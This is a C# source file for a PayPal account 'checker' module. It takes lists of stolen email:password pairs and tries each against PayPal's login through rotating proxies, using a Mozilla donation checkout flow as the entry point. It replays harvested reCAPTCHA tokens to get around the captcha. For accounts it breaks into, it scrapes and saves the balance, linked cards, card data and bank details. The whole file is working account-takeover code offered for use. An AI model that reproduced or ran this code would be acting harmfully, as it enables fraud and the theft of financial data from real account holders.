using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class PayPalCapLess
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());

                string rand = RandomDigits(5);
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Access-Control-Request-Method", "POST");
                httpRequest.AddHeader("Connection", "keep-alive");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.52");
                httpRequest.AddHeader("Sec-Fetch-Site", "cross-site");
                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                string str1 = httpRequest.Get("https://donate.mozilla.org/en-US/").ToString();
                string prod1 = Cryptography.LR(str1, "token\": \"production_", "\"}").FirstOrDefault();
                string csr = httpRequest.Cookies.GetCookies("https://donate.mozilla.org/en-US/")["csrftoken"].ToString();
                if (string.IsNullOrEmpty(prod1))
                {
                    ++Program.Retrie;
                    return false;
                }
                string prod = "production_" + prod1;
                Guid gid1 = Guid.NewGuid();
                string gid = gid1.ToString();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("Origin", "https://donate.mozilla.org");
                httpRequest.AddHeader("sec-ch-ua", "\"Opera GX\";v=\"81\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"95\"").ToString();
                httpRequest.AddHeader("sec-ch-ua-mobile", "?0");
                httpRequest.AddHeader("sec-ch-ua-platform", "\"Windows\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.52");
                httpRequest.AddHeader("Sec-Fetch-Site", "cross-site");
                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                httpRequest.AddHeader("cookie", ""+csr);
                string str2 = httpRequest.Post("URL HERE" + "h8yc8prjc9h3nxxd" + "/client_api/v1/paypal_hermes/create_payment_resource", "{\"returnUrl\":\"https://www.paypal.com/checkoutnow/error\",\"cancelUrl\":\"https://www.paypal.com/checkoutnow/error\",\"offerPaypalCredit\":false,\"merchantAccountId\":\"MozillaFoundat_GBP\",\"experienceProfile\":{\"brandName\":\"Mozilla Foundation\",\"noShipping\":\"true\",\"addressOverride\":false},\"amount\":\"20\",\"currencyIsoCode\":\"GBP\",\"braintreeLibraryVersion\":\"braintree/web/3.62.2\",\"_meta\":{\"merchantAppId\":\"donate.mozilla.org\",\"platform\":\"web\",\"sdkVersion\":\"3.62.2\",\"source\":\"client\",\"integration\":\"custom\",\"integrationType\":\"custom\",\"sessionId\":\"" + gid+ "\"},\"tokenizationKey\":\"" + prod+ "\"}", "application/json").ToString();
                //Console.WriteLine(str2);
                string pt = Cryptography.LR(str2, "\"paymentToken\":\"", "\",").FirstOrDefault();
                //Console.WriteLine("pt" + pt);
                string token = Cryptography.LR(str2, "token=", "\",").FirstOrDefault();
                //Console.WriteLine(token);

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("cookie", "" + csr);
                string str3 = httpRequest.Get("URL HERE" + token).ToString();
                var cock = httpRequest.Cookies.GetCookies("URL HERE" + token);
                string csrf = Cryptography.LR(str3, "data-csrf-token=\"", "\"").FirstOrDefault();
                string si = Cryptography.LR(str3, "_sessionID\" value=\"", "\"").FirstOrDefault();
                //Console.WriteLine(cock);

                //httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                //httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
                httpRequest.AddHeader("cache-control", "max-age=0");
                httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("origin", "https://www.paypal.com");
                httpRequest.AddHeader("referer", "URL HERE" + token+ "&xcomponent=1");
                httpRequest.AddHeader("sec-ch-ua", "\"Opera GX\";v=\"81\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"95\"");
                httpRequest.AddHeader("sec-ch-ua-mobile", "?0");
                httpRequest.AddHeader("sec-ch-ua-platform", "\"Windows\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.52");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                httpRequest.AddHeader("cookie", "" + csr + "; " + cock["d_id"] + "; LANG=he_IL%3BIL; tsrce=unifiedloginnodeweb; cookie_check=yes; " + cock["x-pp-s"] + "; " + cock["nsid"] + "; " + cock["l7_az"] + "; " + cock["ts"] + "; " + cock["ts_c"] + "; " + cock["x-cdn"]);
                string str4 = httpRequest.Post("URL HEREx_" + token + "&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26locale.x%3Den_US%26fundingSource%3Dpaypal%26sessionID%3D%26buttonSessionID%3D%26env%3Dproduction%26fundingOffered%3Dpaypal%26logLevel%3Dwarn%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQubWluLmpzIn0%26uid%3D%26version%3Dmin%26token%3D" + token + "%26xcomponent%3D1%26rcache%3D1%26cookieBannerVariant%3D1&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQubWluLmpzIn0&locale.x=en_US&country.x=US&flowId=" + token, "_csrf=" + csrf + "&_sessionID=" + si + "&locale.x=en_US&processSignin=main&fn_sync_data=&ctxId=xo_ctx_" + token + "&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_" + token + "%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526locale.x%253Den_US%2526fundingSource%253Dpaypal%2526sessionID%253Duid_d69f534bc7_mti6mdq6mzc%2526buttonSessionID%253Duid_41d78e1744_mti6mdq6mzg%2526env%253Dproduction%2526fundingOffered%253Dpaypal%2526logLevel%253Dwarn%2526sdkMeta%253DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQubWluLmpzIn0%2526uid%253Dd6f6fabf4d%2526version%253Dmin%2526token%253D" + token + "%2526xcomponent%253D1%2526rcache%253D1%2526cookieBannerVariant%253D1%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQubWluLmpzIn0%26locale.x%3Den_US%26country.x%3DUS%26flowId%3D" + token + "&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26locale.x%3Den_US%26fundingSource%3Dpaypal%26sessionID%3Duid_d69f534bc7_mti6mdq6mzc%26buttonSessionID%3Duid_41d78e1744_mti6mdq6mzg%26env%3Dproduction%26fundingOffered%3Dpaypal%26logLevel%3Dwarn%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQubWluLmpzIn0%26uid%3Dd6f6fabf4d%26version%3Dmin%26token%3D" + token + "%26xcomponent%3D1%26rcache%3D1%26cookieBannerVariant%3D1&phoneCode=US+%2B1&login_email=" + strArray1[0] + "&captchaCode=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&login_password=" + strArray1[1] + "&captcha=&splitLoginContext=inputPassword&otpMayflyKey=eb3eab082b1f4914a9aac2726d58305cotpChlg&legalCountry=BR&partyIdHash=c0d40547a3db40fa09d7b6a26156b15c7a6d13a134396e6316d95d71bf647400", "application/x-www-form-urlencoded").ToString(); ;
                var nextcook = httpRequest.Cookies.GetCookies("URL HERE" + token + "&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26locale.x%3Den_US%26fundingSource%3Dpaypal%26sessionID%3D%26buttonSessionID%3D%26env%3Dproduction%26fundingOffered%3Dpaypal%26logLevel%3Dwarn%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQubWluLmpzIn0%26uid%3D%26version%3Dmin%26token%3D" + token + "%26xcomponent%3D1%26rcache%3D1%26cookieBannerVariant%3D1&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQubWluLmpzIn0&locale.x=en_US&country.x=US&flowId=" + token);
                
                string time = DateTimeOffset.Now.ToUnixTimeSeconds().ToString();
                string hash = Cryptography.LR(str4, "name=\"_hash\" value=\"", "\"").FirstOrDefault();
                hash = WebUtility.UrlEncode(hash);
                string sind = Cryptography.LR(str4, "name=\"_sessionID\" value=\"", "\"").FirstOrDefault();
                string reqid = Cryptography.LR(str4, "name=\"_requestId\" value=\"", "\"").FirstOrDefault();
                string grc = Cryptography.LR(str4, "name=\"grc_eval_start_time_utc\" value=\"", "\"").FirstOrDefault();
                string csrf1 = Cryptography.LR(str4, "name=\"_csrf\" value=\"", "\"").FirstOrDefault();
                csrf1 = WebUtility.UrlEncode(csrf1);
                httpRequest.ClearAllHeaders();

                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded");
                //httpRequest.AddHeader("cookie", "" + csr);
                string str5 = httpRequest.Get("URL HERE").ToString();
                string TK = Cryptography.LR(str5, "type=\"hidden\" id=\"recaptcha-token\" value=\"", "\"").FirstOrDefault();
                string addr = httpRequest.Address.ToString();

                //httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                //httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7");
                httpRequest.AddHeader("origin", "https://www.google.com");
                httpRequest.AddHeader("referer", ""+addr);
                httpRequest.AddHeader("sec-fetch-dest", "empty");
                httpRequest.AddHeader("sec-fetch-mode", "cors");
                httpRequest.AddHeader("sec-fetch-site", "same-origin");
                //httpRequest.AddHeader("cookie", "" + csr);
                string str6 = httpRequest.Post("URL HERE", "v=_7Co1fh8iT2hcjvquYJ_3zSP&reason=q&c="+TK+ "&k=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&co=aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ", "application/x-www-form-urlencoded").ToString();
                var gre = httpRequest.Cookies.GetCookies("URL HERE");
                string vlone = Cryptography.LR(str6, "[\"rresp\",\"", "\"").FirstOrDefault();
                vlone = WebUtility.UrlEncode(vlone);
                //Console.WriteLine("vlone: " + vlone);
                string time1 = DateTimeOffset.Now.ToUnixTimeSeconds().ToString();

                //httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Host", "www.paypal.com");
                httpRequest.AddHeader("referer", "URL HERE" + token+ "&xcomponent=1");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148");
                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
                //httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("Origin", "https://www.paypal.com");
                httpRequest.AddHeader("Connection", "keep-alive");
                httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Cache-Control", "no-cache");
                httpRequest.AddHeader("TE", "Trailers");
                //httpRequest.AddHeader("cookie", "" + WebUtility.UrlEncode(csr) + "; " + cock["d_id"] + "; LANG=en_US%3BIL; tsrce=unifiedloginnodeweb; cookie_check=yes; " + nextcook["x-pp-s"] + "; " + cock["nsid"] + "; " + cock["l7_az"] + "; " + nextcook["ts"] + "; " + cock["ts_c"] + "; " + cock["x-cdn"]+"; "+gre["_GRECAPTCHA"]);
                string str7 = httpRequest.Post("https://www.paypal.com/auth/validatecaptcha", "_recaptchaEnterpriseEnabled=true&_adsRecaptchaSiteKey=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&_csrf=" + csrf1 + "&_requestId=" + reqid+ "&_hash=" + hash+ "&grc_eval_start_time_utc=" + grc+ "&_sessionID=" + sind+ "&recaptcha=" + vlone+ "&grc_render_start_time_utc=" + time+ "&grc_render_end_time_utc=" + time1, "application/x-www-form-urlencoded").ToString();
                string str8 = httpRequest.Address.ToString();

                Console.WriteLine("str7: " + str7);
                if (str7.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC") || str8.Contains("hermes"))
                {
                    try
                    {
                        httpRequest.ClearAllHeaders();
                        httpRequest.AllowAutoRedirect = true;
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148");
                        httpRequest.AddHeader("Pragma", "no-cache");
                        httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                        httpRequest.AddHeader("Host", "www.paypal.com");
                        httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
                        //httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("Origin", "https://www.paypal.com");
                        httpRequest.AddHeader("Connection", "keep-alive");
                        httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                        httpRequest.AddHeader("Cache-Control", "no-cache");
                        string str9 = httpRequest.Get("https://www.paypal.com/myaccount/summary").ToString();
                        string balance = Cryptography.LR(str9, "test_balance-tile-currency\">", "<").FirstOrDefault();
                        string cards = Cryptography.LR(str9, "=\"ppvx_text--md cw_tile-itemListHeader\">", "<", true, false).FirstOrDefault();
                        string cardata = Cryptography.LR(str9, "><span class=\"ppvx_text--sm\">", "<", true, false).FirstOrDefault();
                        string bank = Cryptography.LR(str9, "data-test-id=\"bankCard-itemListHeader\">", "<", true, false).FirstOrDefault();

                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine(combo + $"Card: {cards} | Card Data: {cardata} | Bank: {bank} | Balance: {balance}", Color.Green);
                        }
                        Program.Save(combo + $"Card: {cards} | Card Data: {cardata} | Bank: {bank} | Balance: {balance}", "PayPal Capture");
                        return true;
                    }
                    catch
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine(combo + "----Cap Failed", Color.Green);
                        }
                        Program.Save(combo, "PayPal Capture Fail");
                        return true;
                    }
                    

                }
                else if (str8.Contains("For security reasons, you’ll need"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo}", Color.Orange);
                    }
                    Program.Save(combo, "Paypal Expired");
                    return true;
                }
                else if (str8.Contains("Redirecting to <a href=\"/authflow/safe/") || str8.Contains("to <a href=\"https://www.paypal.com/authflow/twofactor") || str8.Contains("Redirecting to <a href=\"/auth/stepup") || str8.Contains("entry"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo}", Color.Orange);
                    }
                    Program.Save(combo, "Paypal 2FA");
                    return true;
                }
                else if (str8.Contains("Some of your info didn't match") || str8.Contains("LoginFailed"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    Program.remove(combo);
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch(Exception)
            {
                //Console.WriteLine(ex);
                ++Program.Retrie;
                return false;
            }
        }
        public static string RandomDigits(int length)
        {
            Random random = new Random();
            string empty = string.Empty;
            for (int index = 0; index < length; ++index)
                empty += random.Next(10).ToString();
            return empty;
        }
    }
}
